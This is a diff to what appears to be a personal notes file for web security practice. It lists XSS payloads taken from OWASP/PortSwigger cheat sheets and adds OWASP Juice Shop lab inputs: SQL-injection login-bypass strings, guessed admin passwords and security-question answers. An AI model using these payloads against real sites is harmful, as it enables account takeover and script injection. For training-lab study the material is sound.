@@ -40,3 +40,22 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet OWASP XSS 
 <iframe onload=alert(1)></iframe>
 <em>
 <style>@keyframes x{}</style><em style="animation-name:x" onanimationstart="alert(1)"></em>
+
+---------------------------------
+admin@juice-sh.op
+
+Star Trek
+
+q
+
+admin@juice-sh.op' OR 1=1 --
+
+password
+
+bender@juice-sh.op'--
+
+admin123
+
+Samuel
+
+Mr. N00dles
